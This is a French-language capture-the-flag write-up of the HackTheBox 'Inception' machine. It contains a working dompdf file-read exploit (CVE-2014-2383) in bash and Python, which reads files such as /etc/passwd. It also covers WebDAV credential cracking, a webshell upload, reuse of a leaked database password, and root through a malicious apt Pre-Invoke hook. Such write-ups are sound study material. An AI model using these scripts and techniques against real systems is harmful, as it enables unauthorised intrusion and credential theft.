---
title: "HackTheBox - Inception"
layout: "post"
categories: "Linux"
tags: ["Web", "HackTheBox", "Writeup"]
---

Bonjour à tous, aujourd'hui je vous présente une machine notée hard qui été vraiment original et j'ai pris du plaisir à la root : **Inception** de **HackTheBox**. 😃

## Port Scanning

```bash
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

La machine contient :
  1. Un serveur Apache
  2. Un proxy Squid

## Squid Enumeration

En utilisant [proxychains](https://github.com/haad/proxychains), nous pouvons tenter de passer par ce proxy sans authentification.

Proxychains fonctionne pour les paquets TCP mais pas UDP, donc pour nmap par exemple si nous voulons scanner à travers un proxy il va falloir rajouter le paramètre **-sT** pour préciser à nmap de faire un **scan TCP** (et non SYN par défaut)

Proxychains va prendre les proxies de haut en bas, deplus il y a plusieurs options :

- **Strict chaining**, proxychains suit obligatoirement le chemin donné dans `/etc/proxychains.conf`
- **Dynamic chaining**, proxychains va d'abord détecter si le proxy est up avant de l'utiliser
- **Random chaining**, tout est dans le nom, il va pas suivre un ordre précis

Pour nous connecter au proxy je vais ajouter ceci à ma configuration proxychains :

`http	10.10.10.67	3128`

Ensuite nous pouvons tenter un scan nmap sur le localhost du serveur distant (le flag -f nous permet de spécifier le path de notre fichier de configuration) :

```bash
❯ proxychains -f proxychains.conf nmap -sT 127.0.0.1 -Pn
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 14:21 CET
[proxychains] Dynamic chain  ...  10.10.10.67:3128  ...  127.0.0.1:113 <--denied
...
Nmap scan report for localhost (127.0.0.1)
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3128/tcp open  squid-http
```

Nous découvrons un serveur SSH accessible seulement en local cependant nous pouvons nous y connecter en passant par le proxy.

## CVE-2014-2383 - dompdf 0.6.0 Arbitrary File Read

En fuzzant les directories on découvre un directory /dompdf :

![webdir](https://i.imgur.com/oQlS9iA.png)

Après quelques recherches [dompdf](https://github.com/dompdf/dompdf) est un convertisseur HTML to PDF.

Nous pouvons trouver la version de cette outil dans le fichier /dompdf/VERSION. Nous avons ici **DOMPDF 0.6.0**.


```bash
❯ searchsploit dompdf 0.6.0
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                                                                                | php/webapps/33004.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
❯ searchsploit -m php/webapps/33004.txt
  Exploit: dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/33004
     Path: /usr/share/exploitdb/exploits/php/webapps/33004.txt
❯ cat 33004.txt
Vulnerability title: Arbitrary file read in dompdf
CVE: CVE-2014-2383
Vendor: dompdf
Affected version: v0.6.0

Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Web interface:

http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```

Avec la [CVE-2014-2383](https://www.exploit-db.com/exploits/33004), nous pouvons lire des fichiers locaux du serveur. Cette vulnérabilité nécessite que le flag de configuration DOMPDF_ENABLE_PHP soit activé (désactivé par défaut).

En utilisant les **PHP Wrappers**, il est possible de contourner la protection "chroot" (DOMPDF_CHROOT) qui empêche dompdf d'accéder aux fichiers système ou d'autres fichiers sur le serveur web. (le flag DOMPDF_ENABLE_REMOTE doit être activé)

J'ai tout d'abord essayé de récupérer le fichier /etc/passwd :

`http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd`

Un fichier PDF est généré et celui ci contient le contenu du fichier demandé en base64. Il suffit de déchiffrer cette chaine :

![etc_passwd_base64](https://i.imgur.com/gokJrZf.png)

Nous avons déjà un utilisateur du nom de :

- cobb

J'ai donc fait un petit script en bash qui permet d'automatiser la procédure de cette vulnérabilité car je n'ai pas trouvé de PoC :

```bash
#!/bin/bash

read -p 'Entrez un fichier : ' file

curl -s http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file -o /tmp/nuts

a=`/bin/cat /tmp/nuts`
b=${a#*'[('}
c=${b%%')]'*}
echo $c | base64 -d
```

L'équivalent en python :

```py
import argparse
import urllib.request
import base64

parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()


u = 'http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='

try:
	request = urllib.request.urlopen(u + args.file)

	output = request.read()

	if output:
		contenu = output.decode()
		resultat = contenu[contenu.find("[(")+2:contenu.find(")]")]
		dechiffre = base64.b64decode(resultat).decode('utf8')
		print(dechiffre)

except urllib.error.HTTPError:
	print("Permission Denied for www-data.")
```

## Leak WebDAV credentials

Après avoir essayé du **Log Poisoning** ayant **échoué** car nous n'avons pas les droits de lecture sur les logs.
J'ai effectué de nombreuses recherches et j'ai trouvé des informations dans le fichier de configuration du site par défaut d'Apache à partir de `/etc/apache2/sites-enabled/000-default.conf` :

![find_webdav_creds](https://i.imgur.com/bWvOdUu.png)

La configuration par défaut du site révèle le chemin d'accès à l'installation de WebDAV, ainsi que le chemin local vers les informations d'authentification.

Nous avons maintenant des credentials pour se connecter cependant le mot de passe est hashé en [MD5 APR1](https://svn.apache.org/viewvc/apr/apr/trunk/crypto/apr_md5.c?view=markup) comme on peut le voir avec les informations de l'algorithme ($apr1$) ou en utilisant [hash-identifier](https://tools.kali.org/password-attacks/hash-identifier) :

```bash
❯ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

Possible Hashs:
[+]  MD5(APR)
```

Un petit schéma pour rappeler le format du hash :

![format_hash](https://i.imgur.com/Q5AutjB.png)

Essayons de le casser avec john ou hashcat :

![crack_hash](https://i.imgur.com/O3P3l0D.png)

Maintenant nous pouvous nous connecter avec un WebDAV client comme [cadaver](https://github.com/grimneko/cadaver) et upload un [webshell](https://github.com/Arrexel/phpbash) sur le serveur web :

![log_cadaver_upload_webshell](https://i.imgur.com/MxdX3F6.png)

Ensuite il suffit d'accéder à notre webshell :

![foothold](https://i.imgur.com/bdlmXle.png)

Nous avons enfin un foothold sur la machine ! 😎

## Lateral Movement

Après une rapide énumération, j'ai trouvé des credentials pour une base de données dans le fichier de configuration du WordPress (`/var/www/html/wordpress_4.8.3/wp-config.php`) :

```bash
www-data@Inception
:/var/www/html/webdav_test_inception# cat /var/www/html/wordpress_4.8.3/wp-config.php

<?php

define('DB_NAME', 'wordpress');

define('DB_USER', 'root');

define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

define('DB_HOST', 'localhost');
```

Essayons de nous connecter sur le serveur SSH via proxychains car il est accessible uniquement en local :

![ssh_user](https://i.imgur.com/OsOq8iR.png)

Nous avons enfin un accès en tant que utilisateur cobb ! 😄

## Privilege Escalation

Nous pouvons énumérer les commandes autorisées pour l'utilisateur courant en utilisant `sudo -l` :

![sudo_l](https://i.imgur.com/LXH9GO4.png)

Grosse surprise ! Nous pouvons exécuter n'importe quelle commande en tant que root, donc nous avons les permissions d'exécuter un shell en tant que root. 🙂
Mais le flag root.txt n'est pas ici. C'est parti pour une nouvelle étape d'énumération.

À l'aide de la commande `arp -a`, nous pouvons afficher les tables de cache ARP de toutes les interfaces :

![new_machine](https://i.imgur.com/etJwkx7.png)

Une nouvelle IP locale a été trouvé `192.168.0.1`, commencons par scanner les ports de cette machine avec netcat (présent sur la machine) ou avec un [binaire nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) que nous pouvons upload via cadaver.

Pour ma part je vais utiliser nc :

```bash
root@Inception:~# nc -zuv 192.168.0.1 1-65535 2>&1 | grep -v 'refused'	# SCAN UDP
Connection to 192.168.0.1 53 port [udp/domain] succeeded!
Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
root@Inception:~# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v 'refused'	# SCAN TCP
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
```

Tentons de nous connecter en anonymous sur le serveur FTP :

```bash
root@Inception:~# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Les identifiants anonymous sont activés ! 😏

Une fois connecté nous trouvons un fichier crontab ayant comme path `/etc/crontab` avec 2 cron qui ne sont pas habituels :

![ftp_crontab](https://i.imgur.com/dfIT3Q9.png)

Nous pouvons voir que toutes les 5 minutes les repositories de apt sont mis à jour.
Le but est d'exécuter des commandes lorsque apt update est lancé grâce au cron. Pour cela nous allons upload une configuration apt malveillante dans `/etc/apt/apt.conf.d/` qui va appeler l'exécution d'un reverse shell ou autre.

Le [format de la configuration](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/) apt est la suivante :

```bash
APT::Update::Pre-Invoke {"COMMAND"};
```

À noter que l'accès à la machine hôte par TFTP permet d'accéder à des fichiers supplémentaires qui ne sont pas accessibles par FTP.

Pour faire ceci j'ai décider de générer une clé SSH et d'effectuer un **chmod 600** de cette clé via la configuration apt pour que je puisse me connecter en SSH sur la machine 192.168.0.1 :

![rooted](https://i.imgur.com/CxE3ivh.png)

Après 5 minutes d'attente nous sommes enfin root ! 😁
